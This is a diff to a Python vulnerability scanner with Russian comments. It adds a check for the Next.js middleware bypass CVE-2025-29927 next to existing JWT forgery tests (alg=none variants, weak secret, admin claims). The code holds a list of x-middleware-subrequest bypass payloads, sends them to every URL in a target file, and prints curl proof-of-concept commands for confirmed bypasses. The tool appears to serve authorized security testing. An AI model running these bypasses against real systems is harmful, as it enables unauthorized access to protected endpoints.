@@ -30,6 +30,23 @@ ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
 DEFAULT_JWT_PAYLOAD = {"sub": "admin", "user": "admin", "role": "admin", "admin": True}
 ALG_NONE_CASES = ("none", "None", "NONE")  # некоторые парсеры сравнивают alg регистрозависимо
 
+# CVE-2025-29927: Next.js middleware authorization bypass (CVSS 9.1).
+# Уязвимые версии: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3.
+# Заголовок x-middleware-subrequest используется Next.js внутренне, чтобы не
+# зацикливать middleware при внутренних саброзапросах. Если он присутствует
+# и совпадает с ожидаемым путём/повторением, Next.js считает запрос уже
+# прошедшим через middleware и пропускает его выполнение целиком - а значит,
+# и любые auth-проверки, реализованные в middleware.
+NEXTJS_MIDDLEWARE_BYPASS_HEADER = "x-middleware-subrequest"
+NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS = [
+    "middleware",
+    "src/middleware",
+    "middleware:middleware:middleware:middleware:middleware",
+    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
+    "pages/_middleware",
+    "app/middleware",
+]
+
 # Тривиальные тела ответа вида health-check (OK/HEALTHY/PONG и т.п.) - такие ответы
 # считаются false positive: сервер вернул generic health-check, а не реальные данные
 DEFAULT_TRIVIAL_BODY_VALUES = {
@@ -171,6 +188,12 @@ class CheckResult:
     # "no_auth_required" — эндпоинт и без токена отдаёт 200 (авторизация не требуется вовсе)
     # "protected" — все подделанные токены отклонены
     # None — jwt-test не запускался
+    nextjs_cve_checks: list = field(default_factory=list)
+    nextjs_cve_verdict: Optional[str] = None
+    # "confirmed_bypass" — заголовок x-middleware-subrequest обошёл middleware (CVE-2025-29927)
+    # "protected" — обход не сработал
+    # "not_applicable" — эндпоинт и так был доступен без обхода
+    # None — проверка не запускалась
 
 
 def b64url_encode(data: bytes) -> str:
@@ -359,6 +382,68 @@ def classify_jwt_verdict(baseline_ok: bool, jwt_checks: list) -> str:
     return "protected"
 
 
+@dataclass
+class CveCheck:
+    cve_id: str
+    payload: str
+    status_code: Optional[int] = None
+    content_type: Optional[str] = None
+    body_size: Optional[int] = None
+    accepted: bool = False  # True = запрос с обходным заголовком дал реальный успешный ответ
+    error: Optional[str] = None
+    curl_poc: Optional[str] = None
+    is_trivial_body: bool = False
+
+
+def build_curl_poc_header(url: str, header_name: str, header_value: str) -> str:
+    return f"curl -i -H '{header_name}: {header_value}' '{url}'"
+
+
+def check_cve_2025_29927(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
+                          baseline_ok: bool, ignore_trivial_body: bool = True,
+                          extra_trivial_values: Optional[set] = None) -> tuple[str, list["CveCheck"]]:
+    """Проверяет обход Next.js middleware через заголовок x-middleware-subrequest (CVE-2025-29927, CVSS 9.1).
+
+    Логика вердикта:
+    - baseline_ok=True: эндпоинт и так доступен без обхода - тест неинформативен (not_applicable)
+    - baseline_ok=False и один из payload-запросов дал реальный успешный ответ: confirmed_bypass
+    - baseline_ok=False и ни один payload не сработал: protected
+    """
+    checks = []
+
+    for payload in NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS:
+        headers = dict(base_headers)
+        headers[NEXTJS_MIDDLEWARE_BYPASS_HEADER] = payload
+
+        try:
+            resp = requests.get(url, timeout=timeout, verify=verify_ssl,
+                                 headers=headers, allow_redirects=True)
+        except requests.exceptions.RequestException as e:
+            checks.append(CveCheck(cve_id="CVE-2025-29927", payload=payload, error=str(e)))
+            continue
+
+        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
+        body_size = len(resp.content)
+        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
+        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
+                    and body_size > 0 and not trivial)
+
+        checks.append(CveCheck(
+            cve_id="CVE-2025-29927", payload=payload, status_code=resp.status_code,
+            content_type=content_type, body_size=body_size, accepted=accepted, is_trivial_body=trivial,
+            curl_poc=build_curl_poc_header(url, NEXTJS_MIDDLEWARE_BYPASS_HEADER, payload),
+        ))
+
+    if baseline_ok:
+        verdict = "not_applicable"
+    elif any(c.accepted for c in checks):
+        verdict = "confirmed_bypass"
+    else:
+        verdict = "protected"
+
+    return verdict, checks
+
+
 def read_targets(path: str) -> list[str]:
     targets = []
     try:
@@ -414,7 +499,8 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
                   jwt_rsa_pubkey_pem: Optional[bytes] = None,
                   jwt_identities: Optional[list] = None,
                   ignore_trivial_body: bool = True,
-                  extra_trivial_values: Optional[set] = None) -> CheckResult:
+                  extra_trivial_values: Optional[set] = None,
+                  check_nextjs_cve: bool = False) -> CheckResult:
     try:
         resp = requests.request(
             method,
@@ -455,11 +541,24 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
             )
         jwt_verdict = classify_jwt_verdict(baseline_ok, jwt_checks)
 
+    nextjs_cve_checks = []
+    nextjs_cve_verdict = None
+    if check_nextjs_cve:
+        nextjs_cve_verdict, nextjs_cve_checks = check_cve_2025_29927(
+            url, timeout, verify_ssl, headers, baseline_ok,
+            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
+        )
+
+    common = dict(
+        jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+        nextjs_cve_checks=nextjs_cve_checks, nextjs_cve_verdict=nextjs_cve_verdict,
+    )
+
     if status_code != 200:
         return CheckResult(
             url=url, ok=False, status_code=status_code,
             content_type=content_type, body_size=body_size,
-            reason=f"статус {status_code} != 200", jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+            reason=f"статус {status_code} != 200", **common,
         )
 
     if content_type not in ALLOWED_CONTENT_TYPES:
@@ -467,14 +566,14 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
             url=url, ok=False, status_code=status_code,
             content_type=content_type, body_size=body_size,
             reason=f"content-type '{content_type}' не входит в разрешённые {ALLOWED_CONTENT_TYPES}",
-            jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+            **common,
         )
 
     if body_size == 0:
         return CheckResult(
             url=url, ok=False, status_code=status_code,
             content_type=content_type, body_size=body_size,
-            reason="тело ответа пустое (0 байт)", jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+            reason="тело ответа пустое (0 байт)", **common,
         )
 
     if trivial_body:
@@ -482,12 +581,12 @@ def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers:
             url=url, ok=False, status_code=status_code,
             content_type=content_type, body_size=body_size,
             reason="тело похоже на health-check ответ (OK/HEALTHY и т.п.) - вероятный false positive",
-            jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+            **common,
         )
 
     return CheckResult(
         url=url, ok=True, status_code=status_code,
-        content_type=content_type, body_size=body_size, jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
+        content_type=content_type, body_size=body_size, **common,
     )
 
 
@@ -506,6 +605,12 @@ def main():
                          help="Не отсеивать тривиальные health-check ответы (OK/HEALTHY/PONG и т.п.) - по умолчанию они считаются false positive и не засчитываются")
     parser.add_argument("--ignore-body-value", action="append", default=[], metavar="VALUE",
                          help="Дополнительное тривиальное значение тела ответа для фильтрации как false positive (можно указывать несколько раз), например --ignore-body-value alive")
+
+    cve_group = parser.add_argument_group("Проверки известных CVE (только для авторизованных проверок собственных таргетов)")
+    cve_group.add_argument("--check-nextjs-cve", action="store_true",
+                            help="Проверить CVE-2025-29927 (CVSS 9.1) - обход Next.js middleware через заголовок "
+                                 "x-middleware-subrequest, позволяющий полностью пропустить auth-проверки, "
+                                 "реализованные в middleware. Актуально для Next.js < 12.3.5 / < 13.5.9 / < 14.2.25 / < 15.2.3")
 
     jwt_group = parser.add_argument_group("JWT-тестирование (только для авторизованных проверок собственных таргетов)")
     jwt_group.add_argument("--jwt-test", action="store_true", help="Проверить bypass через JWT: слабый секрет (HS256 'secret'), alg=none (в т.ч. регистровые варианты и пустой payload), плюс негативный контроль (мусорная подпись) для отсева ложных срабатываний")
@@ -594,6 +699,7 @@ def main():
                 check_target, url, args.timeout, args.method, not args.no_verify_ssl, headers,
                 args.jwt_test, args.jwt_secret, jwt_payload, args.jwt_header_name, args.jwt_cookie_name,
                 jwt_rsa_pubkey_pem, jwt_identities, ignore_trivial_body, extra_trivial_values,
+                args.check_nextjs_cve,
             ): url
             for url in targets
         }
@@ -634,6 +740,24 @@ def main():
                 }
                 print(f"       └─ ВЕРДИКТ: {verdict_labels.get(result.jwt_verdict, result.jwt_verdict)}")
 
+            for cc in result.nextjs_cve_checks:
+                if cc.error:
+                    print(f"       └─ CVE-2025-29927[{cc.payload}] ошибка: {cc.error}")
+                elif cc.accepted:
+                    print(f"       └─ [!!! BYPASS] CVE-2025-29927 x-middleware-subrequest='{cc.payload}': status={cc.status_code} type={cc.content_type} size={cc.body_size}B")
+                    print(f"          PoC: {cc.curl_poc}")
+                else:
+                    trivial_note = " (health-check-подобное тело)" if cc.is_trivial_body else ""
+                    print(f"       └─ CVE-2025-29927[{cc.payload}] отклонён: status={cc.status_code}{trivial_note}")
+
+            if result.nextjs_cve_verdict:
+                cve_verdict_labels = {
+                    "confirmed_bypass": "[!!! ПОДТВЕРЖДЕНО] x-middleware-subrequest обходит Next.js middleware (CVE-2025-29927, CVSS 9.1)",
+                    "protected": "[OK] обход через x-middleware-subrequest не сработал",
+                    "not_applicable": "[i] эндпоинт и так доступен без обхода - тест неинформативен",
+                }
+                print(f"       └─ ВЕРДИКТ CVE-2025-29927: {cve_verdict_labels.get(result.nextjs_cve_verdict, result.nextjs_cve_verdict)}")
+
     ok_count = sum(1 for r in results if r.ok)
     fail_count = len(results) - ok_count
     print(f"\n[*] Итого: {len(results)} | успешно: {ok_count} | провалено: {fail_count}")
@@ -668,6 +792,21 @@ def main():
             for r in no_auth:
                 print(f"      - {r.url}")
                 print(f"        PoC (без токена вообще): curl -i '{r.url}'")
+
+    if args.check_nextjs_cve:
+        cve_confirmed = [r for r in results if r.nextjs_cve_verdict == "confirmed_bypass"]
+        cve_protected = [r for r in results if r.nextjs_cve_verdict == "protected"]
+        cve_na = [r for r in results if r.nextjs_cve_verdict == "not_applicable"]
+
+        print(f"\n[*] CVE-2025-29927 вердикты: подтверждён обход={len(cve_confirmed)} | защищено={len(cve_protected)} | не применимо={len(cve_na)}")
+
+        if cve_confirmed:
+            print(f"\n[!!!] ПОДТВЕРЖДЕНО CVE-2025-29927 (CVSS 9.1): обход Next.js middleware через x-middleware-subrequest ({len(cve_confirmed)}):")
+            for r in cve_confirmed:
+                for cc in r.nextjs_cve_checks:
+                    if cc.accepted:
+                        print(f"      - {r.url}  [payload='{cc.payload}']")
+                        print(f"        PoC: {cc.curl_poc}")
 
     if args.output:
         # сохраняем в исходном порядке файла
